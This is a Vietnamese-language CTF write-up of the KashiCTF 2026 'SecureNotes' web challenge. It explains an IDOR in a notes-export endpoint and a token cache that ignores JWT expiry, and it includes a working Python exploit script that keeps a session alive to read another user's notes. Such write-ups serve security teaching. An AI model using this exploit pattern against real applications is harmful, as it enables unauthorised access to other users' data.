---
layout: single
title: "[KashiCTF 2026] SecureNotes - IDOR + JWT Cache Bypass"
date: 2026-04-07
classes: wide
categories: [CTF, KashiCTF 2026, web]
tags: [web, kashictf, idor, jwt, token-cache]
header:
  teaser: /assets/images/tournaments/kashictf.png
---

## Challenge Info

**Event:** KashiCTF 2026  
**Category:** Web  
**Stack:** Kotlin / Ktor

---

## Nhìn vào challenge

![SecureNotes Interface](/assets/images/securenotes/challenge-view.jpg)

SecureNotes là một note-taking app viết bằng Kotlin/Ktor. Người dùng có thể đăng ký, đăng nhập, tạo và xóa ghi chú — bình thường. Nhưng có thêm một tính năng Export Notes, và flag nằm trong ghi chú của user `owner`:

```kotlin
// Database.kt
val flag = File("/flag.txt").readText()
Notes.insert {
    it[content] = "Something something $flag"
}
```

Mục tiêu: đọc được ghi chú của `owner`.

---

## Đọc source code

Source được cung cấp đầy đủ, gồm các file chính:
- `Application.kt` — routing
- `JwtConfig.kt` — cấp JWT, expire sau **3 phút**  
- `TokenCache.kt` — cache token in-memory
- `NotesViews.kt` — render HTML (có Stored XSS nhưng không cần dùng)

### Lỗ hổng #1: IDOR ở `/notes/request-download`

Endpoint này nhận `username` từ POST body rồi lấy notes của user đó — không có bất kỳ check nào xem `username` có khớp với người đang đăng nhập hay không:

```kotlin
val requestedUsername = params["username"] ?: ""
// Không verify requestedUsername == logged-in user
val user = UserService.getUserByUsername(requestedUsername)
val notes = NoteService.getUserNotes(user.id)
```

Mình thử ngay: POST với `username=owner` → nhưng bị chặn vì server cài **timer 5 phút** trước khi cho download.

### Lỗ hổng #2: JWT expire 3 phút, timer cần 5 phút

```kotlin
// JwtConfig.kt
private const val validityInMs = 3 * 60_000  // JWT chết sau 3 phút

// Application.kt
val grantedTime = System.currentTimeMillis() + (300 * 1000)  // timer 5 phút
```

Login lại để gia hạn JWT? Không được — mỗi lần login tạo token mới với key mới, timer cũng reset về 0.

Đây là cái bẫy mà challenge đặt ra. Nhưng...

### Lỗ hổng #3: TokenCache không check JWT expiration

```kotlin
// TokenCache.kt
fun verifyToken(token: String): Claims? {
    return cache[token]  // Chỉ check cache, bỏ qua JWT expiration hoàn toàn
}
```

Token trong cache chỉ bị cleanup bởi một vòng lặp background chạy mỗi 5 giây. Nếu token vẫn đang được dùng (có request đến), nó không bị xóa. Tức là chỉ cần **ping server đều đặn**, token sẽ tồn tại trong cache vô thời hạn — dù JWT đã expire rồi.

---

## Khai thác

Chiến thuật:
1. Đăng ký và login để lấy JWT
2. POST tới `/notes/request-download` với `username=owner` → cài timer 5 phút
3. Cứ mỗi 10 giây ping server một lần để keep session alive trong cache
4. Sau 300 giây, gọi lại endpoint → nhận notes của owner

```python
import requests, time, random, string

BASE_URL = "http://34.126.223.46:16986"

def random_username():
    return ''.join(random.choices(string.ascii_lowercase, k=10))

def login(username, password="password123"):
    s = requests.Session()
    s.post(f"{BASE_URL}/register", data={"username": username, "password": password})
    s.post(f"{BASE_URL}/login", data={"username": username, "password": password})
    return s

def request_download(session):
    r = session.post(f"{BASE_URL}/notes/request-download", data={"username": "owner"})
    return r.status_code, r.text

username = random_username()
session = login(username)
request_download(session)  # Khởi động timer

start = time.time()
while True:
    elapsed = int(time.time() - start)
    status, text = request_download(session)
    print(f"[{elapsed}s] {text[:80]}")
    
    if "processing" not in text and status == 200:
        print(f"\n[+] Got it:\n{text}")
        break
    
    time.sleep(10)
```

Output:
```text
[0s]   Your request for data download is being processed...
[10s]  Your request for data download is being processed...
...
[308s] - Something something kashiCTF{67358e160ab0c131916f0c05aebf8aff_scHgG4N370}
```

**Flag:** `kashiCTF{67358e160ab0c131916f0c05aebf8aff_scHgG4N370}`

---

## Tóm lại

Ba lỗ hổng riêng lẻ, nhưng khi kết hợp lại mới thành công:
- **IDOR**: cho phép request notes của bất kỳ user nào
- **Timer**: chặn nếu chưa đủ 5 phút
- **TokenCache**: bypass được timer bằng cách giữ session sống trong cache

Root cause thực sự là `TokenCache.verifyToken()` không check JWT expiration, dẫn đến session tồn tại lâu hơn thiết kế. Nếu fix lỗ hổng này, IDOR cũng trở nên vô dụng vì token sẽ die trước khi timer kết thúc.
